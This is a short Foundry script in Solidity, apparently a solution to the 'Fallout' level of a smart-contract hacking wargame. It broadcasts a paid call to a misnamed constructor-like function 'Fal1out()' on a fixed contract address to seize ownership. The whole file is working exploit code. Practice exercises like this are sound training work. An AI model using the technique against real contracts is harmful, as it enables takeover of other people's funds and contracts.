// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Fallout} from "../src/Level02.sol";

contract FalloutScript is Script {
    Fallout public falloutInstance;

    function setUp() public {
        falloutInstance = Fallout(payable(0xa6ef84a2eDcF73384FAA43933FAC4742c4C71352));
    }

    function run() public {
        vm.startBroadcast();

        (bool success,) = address(falloutInstance).call{value: 0.00005 ether}(abi.encodeWithSignature("Fal1out()"));
        require(success, "Fal1out call failed");

        vm.stopBroadcast();
    }
}
